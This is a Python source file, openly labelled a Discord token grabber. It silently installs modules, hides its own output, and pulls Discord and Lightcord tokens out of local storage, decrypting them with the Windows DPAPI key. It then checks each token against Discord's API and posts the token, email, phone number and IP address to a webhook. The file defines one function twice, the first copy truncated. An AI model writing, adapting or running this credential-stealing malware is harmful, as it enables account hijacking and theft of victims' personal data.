# Simple discord token grabber
# 7-20-25
# Author: AirFlow
# Contact: https://airflowd.netlify.app/

import os
import sys
import re
import json
import base64
import urllib.request
import datetime
import urllib.parse
import subprocess

sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

# Install missing modules on the fly
def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])

import win32crypt
from Crypto.Cipher import AES

WEBHOOK_URL = ''

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Discord PTB': ROAMING + '\\discordptb',
    'Lightcord': ROAMING + '\\Lightcord',
}

def get_encryption_key(path):
    local_state_path = os.path.join(path, "Local State")
    if not os.path.exists(local_state_path):
        print(f"[-] Local State file not found at {local_state_path}")
        return None
    try:
        with open(local_state_path, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(encrypted_key_b64)
        encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return key
    except Exception as e:
        print(f"[!] Failed to get encryption key: {e}")
        return None

def decrypt_token(encrypted_token, key):
    try:
        encrypted_token = base64.b64decode(encrypted_token.split("dQw4w9WgXcQ:")[1])
        nonce = encrypted_token[3:15]
        ciphertext = encrypted_token[15:-16]
        tag = encrypted_token[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag).decode()
        return decrypted
    except Exception as e:
        # Uncomment next line to debug decryption failures
        # print(f"[!] Decryption error: {e}")
        return None

def get_tokens(path):
    path = os.path.join(path, "Local Storage", "leveldb")
    tokens = []
    if not os.path.exists(path):
        return tokens
    try:
        for file_name in os.listdir(path):
            if not (file_name.endswith(".log") or file_name.endswith(".ldb")):
                continue
            with open(os.path.join(path, file_name), errors="ignore") as f:
                content = f.read()
                tokens += re.findall(r"dQw4w9WgXcQ:[^\"]+", content)
                tokens += re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", content)
        return list(set(tokens))  # Remove duplicates
    except Exception as e:
        print(f"[!] Failed to read tokens from {path}: {e}")
        return tokens

def get_headers(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    if token:
        headers["Authorization"] = token
    return headers

def get_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "Unavailable"

def send_to_webhook(embed):
    try:
        data = json.dumps(embed).encode()
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers=get_headers(), method="POST")
        urllib.request.urlopen(req)
        print("[+] Sent info to webhook.")
    except Exception as e:
        print(f"[!] Failed to send webhook: {e}")

def main():
    print("[*] Starting token grabber...")
    ip = get_ip()
    print(f"[+] IP Address: {ip}")
    found_tokens = []

    for platform, path in PATHS.items():
        print(f"[+] Scanning {platform} at {path}")
        key = get_encryption_key(path)
        tokens = get_tokens(path)

        if not tokens:
            print(f"[-] No tokens found in {platform}")
            continue

        for token in tokens:
            decrypted = None
            if token.startswith("dQw4w9WgXcQ:") and key:
                decrypted = decrypt_token(token, key)
                if decrypted is None:
                    continue
            else:
                decrypted = token  

            try:
                req = urllib.request.Request("https://discord.com/api/v9/users/@me", headers=get_headers(decrypted))
                with urllib.request.urlopen(req) as response:
                    if response.status == 200:
                        user_data = json.loads(response.read().decode())
                        if decrypted not in found_tokens:
                            found_tokens.append(decrypted)
                            print(f"[+] Valid token found for user: {user_data['username']}#{user_data['discriminator']}")
                            send_token_info(decrypted, user_data, platform, ip)
            except Exception:
                pass

    if not found_tokens:
        print("[-] No valid tokens found on this machine.")
    else:
        print(f"[+] Found {len(found_tokens)} valid tokens.")

def send_token_info(token, user_data, platform, ip):
    badges = ""
    flags = user_data.get('flags', 0)
    if flags & 64: badges += ":BadgeBravery: "
    if flags & 128: badges += ":BadgeBrilliance: "
    if flags & 256: badges += ":BadgeBalance: "

def send_token_info(token, user_data, platform, ip):
    badges = ""
    flags = user_data.get('flags', 0)
    if flags & 64: badges += ":BadgeBravery: "
    if flags & 128: badges += ":BadgeBrilliance: "
    if flags & 256: badges += ":BadgeBalance: "

    embed = {
        "username": "AirFlow",
        "avatar_url": "https://i.postimg.cc/SjFr90RK/Screenshot-2025-07-08-212908.png",
        "embeds": [
            {
                "title": f"New Discord Token Found: {user_data['username']}#{user_data['discriminator']}",
                "color": 0x1abc9c,
                "thumbnail": {
                    "url": f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png"
                },
                "fields": [
                    {"name": "User ID", "value": user_data['id'], "inline": True},
                    {"name": "Email", "value": user_data.get('email', 'N/A'), "inline": True},
                    {"name": "Phone", "value": user_data.get('phone', 'N/A'), "inline": True},
                    {"name": "Flags", "value": str(flags), "inline": True},
                    {"name": "Badges", "value": badges or "None", "inline": True},
                    {"name": "Platform", "value": platform, "inline": True},
                    {"name": "IP Address", "value": ip, "inline": True},
                    {"name": "Token", "value": f"```{token}```", "inline": False}
                ],
                "footer": {
                    "text": f"Sent at {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} • Developed by AirFlow. https://airflowd.netlify.app/"
                }
            }
        ]
    }
    send_to_webhook(embed)


if __name__ == "__main__":
    main()
